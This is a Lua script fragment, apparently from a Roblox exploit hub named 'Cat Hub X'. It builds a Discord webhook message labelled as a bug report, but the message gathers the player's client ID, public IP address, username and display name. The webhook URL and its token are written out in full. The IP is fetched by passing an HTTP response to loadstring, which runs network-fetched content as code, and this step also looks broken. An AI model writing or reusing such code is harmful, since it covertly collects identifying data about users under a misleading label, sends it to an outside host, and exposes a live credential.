local url = "https://discord.com/api/webhooks/1218178538121990246/Q-eRCiU02Qr_dTLyF1byv2q-mewUFLL83qzSjZyK0f-JR5NxDDhMFqUshp4w_kdQpIoc"
    local data = {
        ["username"] = 'Cat Hub X',
        ['content'] = '',
        ["avatar_url"] = "",
        ["embeds"] = {
            {
                ["description"] = "**Bug Reporting Webhook**",
                ["color"] = tonumber(255), -- color id		
                ["type"] = "rich",
                ["fields"] =  {
                    {
                        ["name"] = "Hwid",
                        ["value"] = '```lua'..'\n'..game:GetService("RbxAnalyticsService"):GetClientId()..'\n```',
                    },
                    {
                        ["name"] = "Hwid",
                        ["value"] = '```lua'..'\n'..loadstring(Game:HttpGet"https://api.ipify.org")()..'\n```',
                    },
                    {
                        ["name"] = "Username",
                        ["value"] = '```lua'..'\n'..game.Players.LocalPlayer.Name..'\n```',
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Display Name",
                        ["value"] = '```lua'..'\n'..game.Players.LocalPlayer.DisplayName..'\n```',
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "Reported Bug",
                },
                ["timestamp"] = DateTime.now():ToIsoDate(),
            }
        },
    }

